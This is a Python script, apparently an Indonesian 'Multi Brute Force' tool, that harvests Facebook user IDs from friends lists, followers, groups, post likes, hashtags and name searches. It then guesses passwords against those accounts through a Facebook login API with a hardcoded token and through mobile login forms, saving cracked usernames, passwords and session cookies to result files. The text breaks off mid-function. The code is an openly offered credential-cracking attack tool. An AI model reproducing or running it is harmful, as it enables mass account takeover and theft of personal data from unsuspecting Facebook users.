#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# python 3.9
import os,sys,re,json,random,uuid,time,ipaddr
from time import sleep as waktu
from concurrent.futures import ThreadPoolExecutor as YayanGanteng
from datetime import datetime
from time import sleep
ct = datetime.now()
n = ct.month
bulan = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'Nopember', 'Desember']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
ok=0
cp=0
loop =0
live=[]
chek=[]
ttl= []
jam = datetime.now().strftime('%H:%M:%S')
mbasic="https://mbasic.facebook.com{}"
def cek():
   try:
       kuki = open('cookies').read()
       todd = {"cookie":kuki}
   except (KeyError, IOError,FileNotFoundError):
       yayanxd()
   ngewe().menu()
def restart():repeath=sys.executable ; os.execl(repeath,repeath,*sys.argv)
try: import requests as req
except ModuleNotFoundError: os.system("python -m pip install requests");restart()
try: from bs4 import BeautifulSoup as parser
except ModuleNotFoundError: os.system("python -m pip install bs4");restart()
user_agent = random.choice(["Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.2 (KHTML, like Gecko) ChromePlus/4.0.222.3 Chrome/4.0.222.3 Safari/532.2"])

def hasil(ok,cp):
    if len(ok) != 0 or len(cp) != 0:
       print("\n\n %s[%s#%s] crack selesai..."%(N,O,N))
       print(f"\n\n\n %s[%s✓%s] total ok : %s{len(ok)}"%(N,H,N,H))
       exit(f" %s[%s×%s] total cp :%s {len(cp)}"%(N,K,N,K))
    else:exit("\n\n %s[%s!%s] opshh kamu tidak mendapatkan hasil:( "%(N,M,N))
    
network = ipaddr.IPv4Network('59.185.23.0/24')
randmon_ip = ipaddr.IPv4Address(random.randrange(int(network.network) + 1, int(network.broadcast) - 1))


P='\x1b[0;97m'
M='\x1b[0;91m'
H='\x1b[0;92m'
K='\x1b[0;93m'
B='\x1b[0;94m'
U='\x1b[0;95m'
O='\x1b[0;96m'
N='\x1b[0m'
my_color = [P, M, H, K, B, U, O, N]
 

		
# LO KONTOL
logo=(f"""{N}
╔═══╗╔═╗╔═╗╔══╗─╔═══╗Created :Muhamad Badru Wasih
╚╗╔╗║║║╚╝║║║╔╗║─║╔══╝
─║║║║║╔╗╔╗║║╚╝╚╗║╚══╗FB.com/Bang.badru23
─║║║║║║║║║║║╔═╗║║╔══╝
╔╝╚╝║║║║║║║║╚═╝║║║───
╚═══╝╚╝╚╝╚╝╚═══╝╚╝───WhatsApps :08811403654
      \n{B}[{P} Multi Brute Force {B}]{P}\n""")

class jawa:
	def __init__(self,url):
		self.url=url		
		try:
			  xixixi = open('__yayan__.txt','r').read()
		except (KeyError, IOError,FileNotFoundError):
			  print(f'\n %s[%s×%s] cookies invalid'%(N,M,N));waktu(1)
			  try:os.remove('cookies');os.remove('__yayan__.txt')
			  except:os.system('rm -rf cookies');os.system('rm -rf __yayan__.txt')
			  yayanxd()
		try:
			  masuk  = req.get('https://graph.facebook.com/me?access_token=%s'%(xixixi))
			  keluar = json.loads(masuk.text)
			  nama   = keluar['name']
		except (KeyError, IOError,FileNotFoundError):
			  print(f'\n %s[%s×%s] cookies invalid'%(N,M,N));waktu(1)
			  try:os.remove('cookies');os.remove('__yayan__.txt')
			  except:os.system('rm -rf cookies');os.system('rm -rf __yayan__.txt')
			  yayanxd()
		except(req.exceptions.ConnectionError,req.exceptions.ChunkedEncodingError,req.exceptions.ReadTimeout):
			  exit('\n %s[%s!%s] Tidak ada koneksi internet'%(N,M,N))
		os.system("clear")
		print(logo)
	
		print(f" [+] bergabung          : %s"%(join))
		print(f" [-] kadaluarsa          : %s"%(exp))
		print(f" [*] ---------------------------------------------")
		print(f" [+] status                  : {H}premium{P}")
		print(f" [*] IP         : %s\n"%(IP))
		print(f" [selamat datang %s%s%s]\n"%(K,nama,N))
		print(f" [01]. crack dari pencarian nama")
		print(f" [02]. crack dari id publik")
		print(f" [03]. crack dari followers")
		print(f" [04]. crack dari like postingan")
		print(f" [05]. crack dari grup")
		print(f" [06]. crack dari hastag")
		print(f" [07]. lihat hasil crack")
		print(f" [%s00%s]. logout (hapus cookie)\n"%(M,N))
class ngewe:
	def __init__(self):
		self.asuu = open('cookies').read()
		self.ahhh = {"cookie":self.asuu}
		self.url="https://mbasic.facebook.com"
		self.id=[]
# dump id dari followers
	def folower(self,hencet):
		try:
			kontol=req.get(hencet,cookies=kueh).text
			memek=re.findall('" \/>\<div\ class\=\"..\"\>\<a\ href\=\"\/(.*?)\"\><span\>(.*?)\<\/span\>',kontol) 
			for softek in memek:
				if "&amp;refid=" in softek[0]:
					self.id.append(re.findall("id=(.*?)&",softek[0])[0]+"<=>"+softek[1])
				elif "profile.php?" in softek[0]:
					self.id.append(re.findall("id=(.*)",softek[0])[0]+"<=>"+softek[1])
				elif "?refid=" in softek[0]:
					self.id.append(re.findall("(.*?)\?refid=",softek[0])[0]+"<=>"+softek[1])
				else:
					self.id.append(softek[0]+"<=>"+softek[1])
				print(f"\r [*] sedang mengumpulkan {len(self.id)} id... ",end="")
			if "Lihat Selengkapnya" in kontol:
				self.folower(self.url+parser(kontol,"html.parser").find("a",string="Lihat Selengkapnya").get("href"))
		except:pass
# dump id dari grup
	def grup(self,hencet):
		try:
			kontol=req.get(hencet,cookies=self.ahhh).text
			memek=re.findall('\<h3\>\<a\ class\=\"..\"\ href\=\"\/(.*?)\"\>(.*?)<\/a\>',kontol)
			for softek in memek:
				if "profile.php?" in softek[0]:
					self.id.append(re.findall("id=(.*)",softek[0])[0]+"<=>"+softek[1])
				else:
					self.id.append(softek[0]+"<=>"+softek[1])
				print(f"\r [*] sedang mengumpulkan {len(self.id)} id... ",end="")
			if "Lihat Selengkapnya" in kontol:
				self.grup(self.url+parser(kontol,"html.parser").find("a",string="Lihat Selengkapnya").get("href"))
			else:
				def geh(gey):
					a=req.get(gey,cookies=self.ahhh).text
					b=re.findall('\<h3\ class\=\".*?">\<span>\<strong>\<a\ href\=\"/(.*?)\">(.*?)</a\>\</strong\>',a)
					if len(b)!=0:
						for c in b:
							if "profile.php" in c[0]:
								d=re.search("profile.php\?id=(\\d*)",c[0]).group(1)
								if d in self.id:
									continue
								else:
									self.id.append(d+"<=>"+c[1])
							else:
								d=re.search("(.*?)\?refid",c[0]).group(1)
								if d in self.id:
									continue
								else:
									self.id.append(d+"<=>"+c[1])
							print(f"\r [*] sedang mengumpulkan {len(self.id)} id... ",end="")
					if "Lihat Postingan Lainnya" in a:
						geh(self.url+parser(a,"html.parser").find("a",string="Lihat Postingan Lainnya").get("href"))
				geh(f"{self.url}/groups/"+re.search("id=(\\d*)",hencet).group(1))
		except:pass
# dump id dari pencarian nama
	def search(self,hencet,jum):
		try:
			true=False
			kontol=req.get(hencet,cookies=self.ahhh).text
			memek=re.findall('picture" \/>\<\/a\>\<\/td\>\<td\ class\=\"(.*?)\"\>\<a\ href\=\"\/(.*?)"\>\<div\ class\=\"..\"\>\<div\ class\=\"..\"\>(.*?)<\/div>',kontol)
			for softek in memek:
				if "profile.php?" in softek[1]:
					self.id.append(re.findall("id=(.*?)&amp;refid",softek[1])[0]+"<=>"+softek[2])
				else:
					self.id.append(re.findall("(.*?)\?refid=",softek[1])[0]+"<=>"+softek[2])
				print(f"\r [*] sedang mengumpulkan {len(self.id)} id... ",end="")
				if len(self.id)==jum:
					true=True
					break
			if true==False:
				if "Lihat Hasil Selanjutnya" in kontol:
					self.search(parser(kontol,"html.parser").find("a",string="Lihat Hasil Selanjutnya").get("href"),jum)
		except:pass
# dump id dari teman
	def teman(self,hencet):
		try:
			kontol=req.get(hencet,cookies=self.ahhh).text
			memek=re.findall('middle\"\>\<a\ class\=\"..\"\ href\=\"(.*?)\"\>(.*?)\<\/a\>',kontol)
			for softek in memek:
				if "?uid" in softek[0]:
					self.id.append(re.findall("uid\=(.*?)\&",softek[0])[0]+"<=>"+softek[1])
				else:
					self.id.append(re.findall("\/(.*?)\?fref",softek[0])[0]+"<=>"+softek[1])
				print(f"\r [*] sedang mengumpulkan {len(self.id)} id... ",end="")
			if "Lihat selengkapnya" in kontol:
				self.teman(self.url+parser(kontol,"html.parser").find("a",string="Lihat selengkapnya").get("href"))
		except:pass
# dump id teman dari teman
	def teman_dari_teman(self,hencet):
		try:
			kontol=req.get(hencet,cookies=self.ahhh).text
			memek=re.findall('middle\"\>\<a\ class\=\"..\"\ href\=\"(.*?)\"\>(.*?)\<\/a\>',kontol)
			for softek in memek:
				if "profile.php?" in softek[0]:
					self.id.append(re.findall("id\=(.*?)\&",softek[0])[0]+"<=>"+softek[1])
				else:
					self.id.append(re.findall("\/(.*?)\?fref",softek[0])[0]+"<=>"+softek[1])
				print(f"\r [*] sedang mengumpulkan {len(self.id)} id... ",end="")
			if "Lihat Teman Lain" in kontol:
				self.teman_dari_teman(self.url+parser(kontol,"html.parser").find("a",string="Lihat Teman Lain").get("href"))
		except:pass
# dump id dari postingan
	def reactpost(self,hencet):
		try:
			kontol=req.get(hencet,cookies=self.ahhh).text
			if "Semua 0" in kontol:
				print(f" [!] Tidak Ada Yang Menanggapi Postingan, Awokawokawok Kasian Akun Nya Sepi:v");waktu(3);self.menu()
			else:
				memek=re.findall('\<h3\ class\=\".."\>\<a\ href\=\"(.*?)"\>(.*?)<\/a\>',kontol)
				for softek in memek:
					if "profile.php?" in softek[0]:
						self.id.append(re.findall("id=(.*)",softek[0])[0]+"<=>"+softek[1])
					else:
						self.id.append(re.findall("/(.*)",softek[0])[0]+"<=>"+softek[1])
					print(f"\r [*] sedang mengumpulkan {len(self.id)} id... ",end="")
				if "Lihat Selengkapnya" in kontol:
					self.reactpost(self.url+parser(kontol,"html.parser").find("a",string="Lihat Selengkapnya").get("href"))
		except:pass
# dump id dari hastag
	def hastag(self,hencet,jum):
		try:
			true=False
			kontol=req.get(hencet,cookies=self.ahhh).text
			memek=re.findall('\<h3\ class\=\".*?">\<span>\<strong>\<a\ class\=\".."\ href\=\"(.*?)__tn__=C">(.*?)</a\>',kontol)
			for softek in memek:
				if "profile.php?" in softek[0]:
					tol=re.search("profile.php\?id=(\\d*)",softek[0]).group(1)
					if "/" in tol[-1:]:
						continue
					else:
						if tol in self.id:
							continue
						else:
							self.id.append(tol+"<=>"+softek[1])
				else:
					tol=re.search("/(.*?)\?",softek[0]).group(1)
					if "/" in tol[-1:]:
						continue
					else:
						if tol in self.id:
							continue
						else:
							self.id.append(tol+"<=>"+softek[1])
				print(f"\r [*] sedang mengumpulkan {len(self.id)} id... ",end="")
				if len(self.id)==jum:
					true=True
					break
			if true==False:
				if "Lihat Hasil Selanjutnya" in kontol:
					self.hastag(parser(kontol,"html.parser").find("a",string="Lihat Hasil Selanjutnya").get("href"),jum)
		except:pass
# menu
	def menu(self):
		jawa(self.url)
		self.asuu = open('cookies').read()
		self.ahhh = {"cookie":self.asuu}
		jembut = input(" [?] choose : ")
		if jembut in["2","02"]:
			print (" [*] isi 'me' jika ingin crack dari daftar teman")
			kontol = input(" [?] masukan id atau username : ")
			if kontol in[""," "]:
				print(f'\n %s[%s×%s] Jangan kosong tod'%(N,M,N));waktu(1);self.menu()
			elif kontol.isdigit():
				memek=f"{self.url}/profile.php?id={kontol}&v=friends"
			else:
				memek=f"{self.url}/{kontol}/friends"
			try:
				ajg=req.get(memek,cookies=self.ahhh).text
				if "Tidak Ada Teman Untuk Ditampilkan" in ajg:
					print(f" [!] daftar teman tidak di publikasikan");waktu(2);self.menu()
				elif "Halaman yang Anda minta tidak ditemukan." in ajg:
					print(f" [!] pengguna dengan id {kontol} tidak ditemukan");waktu(2);self.menu()
				elif "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in ajg:
					print(f" [!] facebook membatasi setiap aktivitas, limit bro, silahkan beralih akun");waktu(2);self.menu()
				elif "Konten Tidak Ditemukan" in ajg:
					print(f" [!] Pengguna Dengan Id {kontol} tidak ditemukan");waktu(2);self.menu()
				elif kontol in["ME","Me","me"]:
					self.teman(f"{self.url}/friends/center/friends/")
				else:
					#print(f" [*] crack dari teman : "+re.findall("\<title\>(.*?)<\/title\>",ajg)[0])
					print(f" [!] untuk berhenti tekan CTRL lalu tekan c di keyboard anda.")
					self.teman_dari_teman(memek)
			except(req.exceptions.ConnectionError,req.exceptions.ChunkedEncodingError,req.exceptions.ReadTimeout):
				exit(" [!] kesalahan pada koneksi")
		if len(self.id)!=0:
			print(f"")
			self.plerr()
		elif jembut in["7","07"]:
			print(f"\n %s[%s1%s] Check hasil OK"%(N,O,N))
			print(f" %s[%s2%s] Check hasil CP"%(N,O,N))
			ask=input("\n %s[%s?%s] Choose : "%(N,K,N))
			if ask in[""," "]: 
				print(f" [!] pilih yang bener ajg");self.menu()
			elif ask in["1","01"]:
				try:
					totalok = open("results/OK-%s-%s-%s.txt"%(ha, op, ta)).read().splitlines()
					print(f"\n %s[%s#%s] --------------------------------------------"%(N,O,N))
					print(f" [%s+%s] Hasil %sOK%s pada tanggal %s: %s%s-%s-%s%s total %s: %s%s%s\n"%(H,N,H,N,M,H,ha,op,ta,N,M,H,len(totalok),H))
					os.system("cat results/OK-%s-%s-%s.txt"%(ha, op, ta))
					print(f"\n %s[%s#%s] --------------------------------------------"%(N,O,N))
					input('\n  [ %sKEMBALI%s ] '%(O,N));self.menu()
				except (IOError):
					print(f"\n %s[%s×%s] Opshh kamu tidak mendapatkan hasil ok :("%(N,M,N))
					input('\n  [ %sKEMBALI%s ] '%(O,N));self.menu()
			elif ask in["2","02"]:
				try:
					totalcp = open("results/CP-%s-%s-%s.txt"%(ha, op, ta)).read().splitlines()
					print(f"\n %s[%s#%s] --------------------------------------------"%(N,O,N))
					print(f" [%s×%s] Hasil %sCP%s pada tanggal %s: %s%s-%s-%s%s total %s: %s%s%s\n"%(K,N,K,N,M,K,ha,op,ta,N,M,K,len(totalcp),K))
					os.system("cat results/CP-%s-%s-%s.txt"%(ha, op, ta))
					print(f"\n %s[%s#%s] --------------------------------------------"%(N,O,N))
					input('\n  [ %sKEMBALI%s ] '%(O,N));self.menu()
				except (IOError):
					print(f"\n %s[%s×%s] Opshh kamu tidak mendapatkan hasil cp :("%(N,M,N))
					input('\n  [ %sKEMBALI%s ] '%(O,N));self.menu()
			else:
				print(f" [!] pilih yang bener ajg");self.menu()
		elif jembut in["0","00"]:
			print ('\n')
			tod()
			print(f'\n %s[%s✓%s] Berhasil menghapus cookies'%(N,O,N))
			try:os.remove('cookies');os.remove('__yayan__.txt')
			except:os.system('rm -rf cookies');os.system('rm -rf __yayan__.txt')
			exit()
		try:
			if jembut in["1","01"]:
				while True:
					kontol = input(f" {N}[?] masukan nama pencarian (cht : zuck): ")
					if kontol in[""," "]:
						print(f'\n %s[%s×%s] Jangan kosong tod'%(N,M,N));waktu(1);self.menu()
					else:
						try:
							ajg=req.get(f"{self.url}/search/people/?q={kontol}",cookies=self.ahhh).text
							if "Maaf, kami tidak menemukan" in ajg:
								print(f" [!] pengguna dengan nama {kontol} tidak ditemukan");waktu(2);self.menu()
							elif "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in ajg:
								print(f" [!] facebook membatasi setiap aktivitas, limit bro, silahkan beralih akun");waktu(2);self.menu()
							else:
								jumlah = int(input(" [?] masukan jumlah id : "))
								print(f" [!] untuk berhenti tekan CTRL lalu tekan c di keyboard anda.")
								if "5000" in str(jumlah):
									jumlah-=1
								if jumlah<5001:
									self.search(f"{self.url}/search/people/?q={kontol}",jumlah);break
								else: exit("\n [!] max 5000")
						except(req.exceptions.ConnectionError,req.exceptions.ChunkedEncodingError,req.exceptions.ReadTimeout):
							exit("\n [!] Kesalahan Pada Koneksi")
						except ValueError:
							exit("\n [!] isi yang bener ajg")
			elif jembut in["3","03"]:
				kontol = input(f"{N} [?] masukan id atau username followers : ")
				if kontol in[""," "]:
					print(f'\n %s[%s×%s] Jangan kosong tod'%(N,M,N));waktu(1);self.menu()
				elif kontol.isdigit():
					memek=f"{self.url}/profile.php?id={kontol}&v=followers"
				else:
					memek=f"{self.url}/{kontol}?v=followers"
				try:
					ajg=req.get(memek,cookies=self.ahhh).text
					if "Halaman Tidak Ditemukan" in ajg:
						print(f" [!] penggunaan dengan id {kontol} tidak ditemukan");waktu(2);self.menu()
					elif "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in ajg:
						print(f" [!] facebook membatasi setiap aktivitas, limit bro, silahkan beralih akun");waktu(2);self.menu()
					else:
						print(f" [*] crack total followers dari : "+re.findall("\<title\>(.*?)<\/title\>",ajg)[0])
						print(f" [!] untuk berhenti tekan CTRL lalu tekan c di keyboard anda.")
						self.folower(memek)
				except(req.exceptions.ConnectionError,req.exceptions.ChunkedEncodingError,req.exceptions.ReadTimeout):
					exit(" [!] kesalahan pada koneksi")
			elif jembut in["4","04"]:
				kontol = input(f"{N} [?] url atau id postingan : ")
				print(f" [!] untuk berhenti tekan CTRL lalu tekan c di keyboard anda.")
				if kontol in[""," "]:
					print(f'\n %s[%s×%s] Jangan kosong tod'%(N,M,N));waktu(1);self.menu()
				elif kontol.isdigit():
					memek=f"{self.url}/{kontol}"
				elif "m.facebook.com" in kontol:
					memek=kontol.replace("m.facebook.com","mbasic.facebook.com")
				elif "www.facebook.com" in kontol:
					memek=kontol.replace("www.facebook.com","mbasic.facebook.com")
				elif "free.facebook.com" in kontol:
					memek=kontol.replace("free.facebook.com","mbasic.facebook.com")
				else:
					memek=kontol
				try:
					ajg=req.get(memek,cookies=self.ahhh).text
					if "Halaman yang diminta tidak bisa ditampilkan sekarang." in ajg:
						print(f" [!] posting tidak ditemukan");waktu(2);self.menu()
					elif "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in ajg:
						print(f" [!] facebook membatasi setiap aktivitas, limit bro, silahkan beralih akun");waktu(2);self.menu()
					else:
						try:
							kuntul=re.findall('\<a\ href\=\"\/ufi\/reaction\/profile\/browser\/(.*?)"',ajg)[0].replace(";","&")
							self.reactpost(f"{self.url}/ufi/reaction/profile/browser/{kuntul}")
						except IndexError:
							print(f" [!] Error, Silahkan Masukkan Id/Url Postingan Dengan Benar");waktu(1);self.menu()
				except(req.exceptions.ConnectionError,req.exceptions.ChunkedEncodingError,req.exceptions.ReadTimeout):
					exit(" [!] kesalahan pada koneksi")
				except req.exceptions.MissingSchema:
					print(f" [!] Why {memek} Mikir Dong Tolol, Masukin Url Postingan Yang Bener Ngentod");waktu(3);self.menu()
			elif jembut in["5","05"]:
				while True:
					kontol = input(f"{N} [?] masukkan id grup : ")
					if kontol in[""," "]:
						print(f'\n %s[%s×%s] Jangan kosong tod'%(N,M,N));waktu(1);self.menu()
					else:
						try:
							ajg=req.get(f"{self.url}/browse/group/members/?id={kontol}",cookies=self.ahhh).text
							if "Halaman Tidak Ditemukan" in ajg:
								print(f" [!] group dengan id {kontol} tidak ditemukan");waktu(2);self.menu()
							elif "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in ajg:
								print(f" [!] facebook membatasi setiap aktivitas, limit bro, silahkan beralih akun");waktu(2);self.menu()
							elif "Konten Tidak Ditemukan" in ajg:
								print(f" [!] group dengan id {kontol} tidak ditemukan");waktu(2);self.menu()
							else:
								print(f" [*] nama grup : "+re.findall("\<title\>(.*?)<\/title\>",ajg)[0][8:])
								print(f" [!] untuk berhenti tekan CTRL lalu tekan c di keyboard anda.")
								self.grup(f"{self.url}/browse/group/members/?id={kontol}");break
						except(req.exceptions.ConnectionError,req.exceptions.ChunkedEncodingError,req.exceptions.ReadTimeout):
							exit(" [!] Kesalahan Pada Koneksi")
			elif jembut in["6","06"]:
				while True:
					kontol = input(f"{N} [?] hastag : ")
					if kontol in[""," "]:
						print(f'\n %s[%s×%s] Jangan kosong tod'%(N,M,N));waktu(1);self.menu()
					else:
						try:
							ajg=req.get(f"{self.url}/hashtag/{kontol}",cookies=self.ahhh).text
							if "Halaman Tidak Ditemukan" in ajg or "Halaman yang Anda minta tidak ditemukan." in ajg:
								print(f" [!] hashtag {kontol} tidak ditemukan");waktu(2);self.menu()
							elif "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in ajg:
								print(f" [!] facebook membatasi setiap aktivitas, limit bro, silahkan beralih akun");waktu(2);self.menu()
							elif "sementara disembunyikan di sini. Beberapa konten di dalam postingan tersebut melanggar Standar Komunitas kami." in ajg:
								print(f" [!] postingan dengan hashtag {kontol} disembunyikan karna melanggar standar komunitas facebook");waktu(2);self.menu()
							else:
								jumlah=int(input(" [?] masukan jumlah id : "))
								print(f" [!] untuk berhenti tekan CTRL lalu tekan c di keyboard anda.")
								if "5000" in str(jumlah):
									jumlah-=1
								if jumlah<5001:
									self.hastag(f"{self.url}/hashtag/{kontol}",jumlah);break
								else: exit("\n [!] max 5000")
						except(req.exceptions.ConnectionError,req.exceptions.ChunkedEncodingError,req.exceptions.ReadTimeout):
							exit(" [!] kesalahan pada koneksi")
						except ValueError:
							exit(" [!] isi yang bener ajg")
				else:
					print(f"\n %s[%s×%s] pilih yang bener ajg"%(N,M,N));waktu(1);self.menu()
				if len(self.id)!=0:
					print(f"")
					self.plerr()
				else:
					print(f"\n %s[%s×%s] gagal mengambil id, silahkan coba lagi"%(N,M,N));waktu(1);self.menu()
			else:
				print(f"\n [{M}×{N}] input gagal, anda adalah user {M}free{N} silahkan upgrade ke {H}Premium")
		except (KeyError, IOError,FileNotFoundError):
			print(f"\n [{M}×{N}] input gagal, anda adalah user {M}free{N} silahkan upgrade ke {H}Premium")
# mulai ngecrot awokawokawokkawok 
	def plerr(self):
		print(f'\n [+] total id -> %s%s%s' %(M,len(self.id),N))
		___yayanganteng___=input("%s [?] apakah anda ingin menggunakan sandi manual? [Y/t]: "%(N))
		if ___yayanganteng___ in(""," "):
			print(f"\n %s[%s×%s] isi yang bener ajing"%(N,M,N));self.plerr()
		elif ___yayanganteng___ in("Y","y"):
			print ('\n [!] gunakan , (koma) untuk pemisah contoh : sandi123,sandi12345,dll. setiap kata minimal 6 karakter atau lebih')
			while True:
				pwek=input('\n [?] masukan kata sandi : ')
				if pwek in(""," "):
					print ('\n %s[%s×%s] jangan kosong bro kata sandi nya'%(N,M,N))
				elif len(pwek)<=5:
					print ('\n %s[%s×%s] kata sandi minimal 6 karakter'%(N,M,N))
				else:
					def __yan__(ysc=None): # ycs => Yayan sayang Cindy:3
						cin=input("\n [?] method : ")
						if cin in(""," "):
							print(f"\n %s[%s×%s] pilih yang bener ajg"%(N,M,N));self.__yan__()
						elif cin in("1","01"):
							print(f'\n [+] hasil OK disimpan ke -> results/OK-%s-%s-%s.txt' % (ha, op, ta))
							print(f' [+] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt' % (ha, op, ta))
							print(f'\n [!] anda bisa mematikan data selular untuk menjeda proses crack\n')
							with YayanGanteng(max_workers=30) as __yayanXD__:
								for ikeh in self.id:
									try:
										kimochi = ikeh.split("<=>")[0]
										__yayanXD__.submit(self.__api__,kimochi,ysc)
									except: pass
							hasil(live,chek)
						elif cin in("2","02"):
							print(f'\n [+] hasil OK disimpan ke -> results/OK-%s-%s-%s.txt' % (ha, op, ta))
							print(f' [+] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt' % (ha, op, ta))
							print(f'\n [!] anda bisa mematikan data selular untuk menjeda proses crack\n')
							with YayanGanteng(max_workers=30) as __yayanXD__:
								for ikeh in self.id:
									try:
										kimochi = ikeh.split("<=>")[0]
										__yayanXD__.submit(self.mbasic_mobile,kimochi,ysc,"https://mbasic.facebook.com")
									except: pass
							hasil(live,chek)
						elif cin in("3","03"):
							print(f'\n [+] hasil OK disimpan ke -> results/OK-%s-%s-%s.txt' % (ha, op, ta))
							print(f' [+] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt' % (ha, op, ta))
							print(f'\n [!] anda bisa mematikan data selular untuk menjeda proses crack\n')
							with YayanGanteng(max_workers=30) as __yayanXD__:
								for ikeh in self.id:
									try:
										kimochi = ikeh.split("<=>")[0]
										__yayanXD__.submit(self.mbasic_mobile,kimochi,ysc,"https://free.facebook.com")
									except: pass
							hasil(live,chek)
						else:
							print ('\n %s[%s!%s] input yang bener goblok!'%(N,M,N))
					print(f"\n [ pilih method login - silahkan coba satu² ]\n")
					print(f" [1]. method API (fast)")
					print(f" [2]. method mbasic (slow)")
					print(f" [3]. method mobile (super slow)")
					__yan__(pwek.split(","))
					break
		elif ___yayanganteng___ in("T","t"):
			print(f"\n [ pilih method login - silahkan coba satu² ]\n")
			print(f" [1]. method API (fast)")
			print(f" [2]. method mbasic (slow)")
			print(f" [3]. method mobile (super slow)")
			self.__pler__()
		else:
			print ('\n %s[%s×%s] y/t goblok!'%(N,M,N));waktu(1);self.menu()
		return
		
	def __api__(self,user,_yan_):
		global ok,cp,ttl,loop
		print(f"\r [{O}{jam}{N}] crack: {str(loop)}/{len(self.id)} OK:-{str(ok)} - CP:-{str(cp)} ",end="")
		for pw in _yan_:
			try: os.mkdir('results')
			except: pass
			try:
				user_agent = open('YNTKTS.txt', 'r').read()
			except (KeyError, IOError):
				user_agent = req.get('https://raw.githubusercontent.com/Yayanxd/user/main/user_agent.txt').text.strip()
			headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 
               'x-fb-net-hni': str(random.randint(20000, 40000)), 
               'x-fb-connection-quality': 'EXCELLENT', 
               'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 
               'user-agent': user_agent, 
               'content-type': 'application/x-www-form-urlencoded', 
               'x-fb-http-engine': 'Liger'}
			ses=req.Session()
			api="https://b-api.facebook.com/method/auth.login"
			param={"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32","format": "JSON","sdk_version": "2","email":user,"locale": "en_US","password":pw,"sdk": "ios","generate_session_cookies": "1","sig": "3f555f99fb61fcd7aa0c44f58f522ef6"}
			send=ses.get(api,params=param, headers=headers_)
			if "session_key" in send.text and "EAAA" in send.text:
				ok+=1
				print(f"\r\x1b[1;32m  * --> {user}|{pw}      \x1b[0m\n",end="")
				open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write(f" [✓] {user}|{pw}\n")
				live.append(f" [✓] {user}{pw}")
				break
			elif "www.facebook.com" in send.json()["error_msg"]:
				cp+=1
				try:
					xixixi = open('__yayan__.txt','r').read()
					ak = req.get('https://graph.facebook.com/%s?access_token=%s'%(user,xixixi))
					az = json.loads(ak.text)
					ttl= az['birthday'].replace("/","-")
					print(f"\r\x1b[1;33m  * --> {uid}|{pw}|{ttl}     \x1b[0m\n",end="")
					open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(f" [×] {user}|{pw}|{ttl}\n")
					chek.append(f" [×] {user}|{pw}|{ttl}")
					break
				except (KeyError, IOError):
					ttl = ' '
				except: pass
				print(f"\r\x1b[1;33m  * --> {user}|{pw}                \x1b[0m\n",end="")
				open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(f" [×] {user}|{pw}\n")
				chek.append(f" [×] {user}|{pw}")
				break
			else:
				continue

		loop += 1

	def mbasic_mobile(self,user,_yan_,beol,**kwargs):
		global ok,cp,ttl,loop
		print(f"\r [{O}{jam}{N}] crack: {str(loop)}/{len(self.id)} OK:-{str(ok)} - CP:-{str(cp)} ",end="")
		for pw in _yan_:
			try: os.mkdir('results')
			except: pass
			ses=req.Session()
			a=ses.get(f"{beol}/login/?next&ref=dbl&refid=8").text
			b=parser(a,"html.parser")
			for x in b.find_all("input"):
				if x.get("name")==None or "_fb_noscript" in x.get("name") or "sign_up" in x.get("name"):continue
				else:kwargs.update({x.get("name"):x.get("value")})
			kwargs.update({"email":user,"pass":pw})
			tol=beol+b.find("form",method="post").get("action")
			if "m.facebook.com" in beol:ses.headers.update({"Host":re.findall("//(.+)",beol)[0],"x-fb-lsd":kwargs.get("lsd"),"content-type":"application/x-www-form-urlencoded","accept":"*/*","user-agent":user_agent,"referer":f"{beol}/login/?next&ref=dbl&fl&refid=8","origin":beol,"accept-encoding":"gzip, deflate","accept-language":"id-ID,en-US;q=0.9"})
			else:
				if "mbasic.facebook.com" in beol:anjg="text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8"
				else:anjg="text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"
				ses.headers.update({"Host":re.findall("//(.+)",beol)[0],"sec-fetch-user":"?1","upgrade-insecure-requests":"1","content-type":"application/x-www-form-urlencoded","cache-control":"max-age=0","accept":anjg,"origin":beol,"user-agent":user_agent,"referer":f"{beol}/login/?next&ref=dbl&fl&refid=8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
			ses.post(tol,data=kwargs,allow_redirects=False)
			kuke=ses.cookies.get_dict()
			if "c_user" in kuke:
				ok+=1
				kuki=f"c_user={kuke.get('c_user')};fr={kuke.get('fr')};xs={kuke.get('xs')}"
				print(f"\r\x1b[1;32m  * --> {kuke.get('c_user')}|{pw}|{kuki}\x1b[0m\n",end="")
				open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write(f" [✓] {kuke.get('c_user')}|{pw}|{kuki}\n")
				live.append(f" [✓] {kuke.get('c_user')}{pw}{kuki}")
				break
			elif "checkpoint" in kuke:
				cp+=1
				try:uid=re.search("3A(\\d*)",kuke.get("checkpoint")).group(1)
				except:uid=user
				try:
					xixixi = open('__yayan__.txt','r').read()
					ak = req.get('https://graph.facebook.com/%s?access_token=%s'%(uid,xixixi))
					az = json.loads(ak.text)
					ttl= az['birthday'].replace("/","-")
